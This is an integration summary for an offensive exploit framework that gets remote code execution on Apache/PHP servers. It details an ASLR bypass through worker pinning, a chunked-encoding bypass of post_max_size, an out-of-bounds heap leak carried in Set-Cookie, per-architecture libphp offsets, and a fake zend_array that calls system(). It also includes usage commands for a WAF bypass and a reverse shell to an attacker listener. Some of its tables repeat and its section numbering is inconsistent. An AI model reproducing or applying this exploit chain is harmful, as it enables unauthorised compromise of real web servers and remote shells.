# ASLR Bypass Integration Summary

## Source Repository
**php2shell-bypass-aslr-exp** by [9bie](https://github.com/9bie/php2shell-bypass-aslr-exp)

## Key ASLR Bypass Techniques Integrated

### 1. Worker Pinning (ASLR Bypass via Process Pinning)
**Source**: `exploit.py` → `hold_workers()` function
**Mechanism**: 
- Holds `MaxRequestWorkers - 1` Apache children with incomplete POST bodies
- Forces all exploit requests (A1, B1, A2, B2) to the same Apache child process
- Makes ASLR predictable across requests since same process = same ASLR layout
- Default: 149 holders for 150 workers (official prefork config)

**Implementation**: `hold_workers()` function in `exploit_enhanced_aslr.py`

### 2. Chunked Encoding Bypass (post_max_size Bypass)
**Source**: `RESEARCH_PURE_128M.md` + `chunked_send.py`
**Mechanism**:
- Uses `Transfer-Encoding: chunked` instead of `Content-Length`
- `rfc1867_post_handler` only checks `content_length` at entry
- Chunked requests have `content_length = 0` → bypasses `post_max_size` check
- Allows sending >8MB bodies for heap shaping
- Uses `chunked_send.py` for delivery

**Implementation**: `send_chunked()` function + `chunked_send.py` integration

### 3. ASLR Bypass via Heap Leak (B1 - Stale-id OOB Read)
**Source**: `mk_leak_b.py` + `RESEARCH_PURE_128M.md` Section 5
**Mechanism**:
1. **A1**: Triggers OOM in END cleanup → leaves dangling `PS(id)` / `PS(mod_data)` + `send_cookie=1`
2. **B1**: Sends crafted multipart with forged `zend_string` header at `id` address
   - Fake header: `refcount=0`, `type=0x16` (IS_STRING|GC_NOT_COLLECTABLE), `len=0xC8000` (800KB)
   - First byte `/` → `valid_key` failure → OOB read
   - `Set-Cookie` encodes 800KB of memory from `id` chunk
4. **Leak Parsing**: 
   - Parses `Set-Cookie` response (800KB+ of heap data)
   - Extracts 64-bit pointers from decoded cookie
   - Finds `zval_ptr_dtor` pointer (appears 1095 times in 800KB window)
   - Calculates `libphp = zval_ptr_dtor - 0x65EB60` (x86_64)
5. **Chunk Base Detection**:
   - Pointers cluster at 2MiB alignments → reveals chunk bases
   - Main chunk fingerprint: pointer count = 87 (`MAIN_BUCKET_COUNT = 87`)
   - Validates with delta range check (`delta_min` to `delta_max`)

### 4. ASLR Offset Profiles (Architecture-Specific)
**Source**: `exploit.py` → `PROFILES` dict

| Symbol | x86_64 | aarch64 |
|--------|--------|---------|
| `zval_ptr_dtor` offset | `0x65EB60` | `0x63812B` |
| `zif_system` offset | `0x465370` | `0x42CD70` |
| `ptr_max` | `0x7FFFFFFFFFFF` | `0xFFFFFFFFFFFF` |
| `delta_min` | `0x1A00000` | `0x1F00000` |
| `delta_max` | `0x1F00000` | `0x2300000` |

### 5. Main Chunk Detection
**Fingerprint**: `MAIN_BUCKET_COUNT = 87`
- Main chunk bucket has exactly 87 pointers in 800KB leak window
- Used to distinguish main chunk from id-chunk and libphp buckets

### 5. LEAK_SPEC (B1 Payload Specification)
```
LEAK_SPEC = "G:511:0x137" × 14 + "G:400:0x137" + "G:511:0x137" + "X:900"
```
- `G:511:0x137` × 14: 511-page flood values at page 0x137 (pulls cached chunks)
- `G:400:0x137`: 400-page value at page 0x137 (creates hole at id chunk tail)
- `G:511:0x137`: Another 511-page flood
- `X:900`: 900 nested array fields → fills holes with real HashTables

### 6. A1: END-cleanup send_cookie OOM
- 860 depth-64 nested file fields + fillers + large values + 4000B `PHP_SESSION_UPLOAD_PROGRESS`
- Causes OOM in `php_url_encode` during END cleanup
- Bailout leaves dangling `PS(id)` / `PS(mod_data)` + `send_cookie=1`

### 6. A2: Cheap-OOM
- 880 depth-64 nested empty file fields
- OOM during multipart parsing before RINIT
- Leaves dangling `PS(http_session_vars)`

### 7. B2: Fake Reference + Fake zend_array
- Sprays fake `zend_reference` (32-byte slots, 500 before + 495 after)
- Fake `zend_array` at `S = main + 0xF8398`
- `pDestructor = zif_system` (calculated from leaked libphp base)
- Triggers `system()` during shutdown via `zend_hash_destroy`

---

## Integration Files

### Key Classes/Functions Added
| Component | Purpose |
|-----------|---------|
| `ASLRBypassConfig` | Configuration dataclass for ASLR bypass options |
| `hold_workers()` | Worker pinning (149 holders) |
| `parse_leak()` | Leak parsing with bucket analysis & MAIN_BUCKET_COUNT |
| `hold_workers()` | Worker pinning (149 holders) |
| `send_chunked()` | Chunked encoding for post_max_size bypass |
| `build_leak_spec()` | Generates LEAK_SPEC for B1 |
| `parse_leak()` | Leak parsing with bucket analysis |
| `PROFILES` | Architecture-specific offset profiles |
| `LEAK_SPEC` | B1 payload specification |
| `MAIN_BUCKET_COUNT` | Main chunk fingerprint (87) |
| `PROFILES` | Architecture-specific offsets |
| `LEAK_SPEC` | B1 payload specification |
| `hold_workers()` | Worker pinning |
| `send_chunked()` | Chunked encoding |

### New CLI Options
```bash
--aslr-bypass           # Enable all ASLR bypass techniques
--worker-pinning        # Enable worker pinning (holds N-1 workers)
--workers N             # Worker count for pinning (default: 150)
--chunked-encoding      # Use chunked encoding (bypass post_max_size)
--leak-analysis         # Enable B1 heap leak analysis
--leak-retries N        # Leak retries (default: 3)
```

---

## Usage Examples

```bash
# Full ASLR bypass with all techniques
python3 exploit_enhanced_aslr.py --url http://target.com --aslr-bypass --workers 150

# With Cloudflare WAF bypass + ASLR bypass
python3 exploit_enhanced_aslr.py --url https://target.com --waf-bypass --aslr-bypass

# Reverse shell with ASLR bypass
python3 exploit_enhanced_aslr.py --url http://target --connection --lhost 10.10.14.5 --lport 4444 --aslr-bypass

# Custom worker count
python3 exploit_enhanced_aslr.py --url http://target --aslr-bypass --workers 150 --leak-analysis
```

---


## Attribution
All ASLR bypass techniques sourced from **php2shell-bypass-aslr-exp** by **9bie** (GitHub).
Original research and exploitation chain by the php2shell project team.
Integrated by **TESTERXMA** into enhanced exploit framework.
